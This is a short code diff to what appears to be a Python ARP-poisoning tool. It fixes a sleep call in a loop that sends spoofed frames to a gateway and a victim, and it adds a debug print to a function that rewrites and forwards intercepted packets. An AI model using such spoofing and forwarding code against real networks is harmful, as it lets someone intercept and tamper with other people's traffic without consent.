@@ -71,7 +71,7 @@ def poisoner(gateway_IP, victim_IP, new_MAC=None, verbose=0, interval=1, duratio
     while time.time() < end_time:
         send(frame_to_gateway)
         send(frame_to_victim)
-        sleep(interval)
+        time.sleep(interval)
         n_times += 1
     return n_times
 
@@ -131,4 +131,5 @@ def forward(packet):
     packet[Ether].dst = dst_MAC
     packet[IP].src = src_IP
     packet[IP].dst = dst_IP
+    print("src_IP : {}, dst_IP : {}".format(src_IP, dst_IP))
     send(packet, verbose=False)
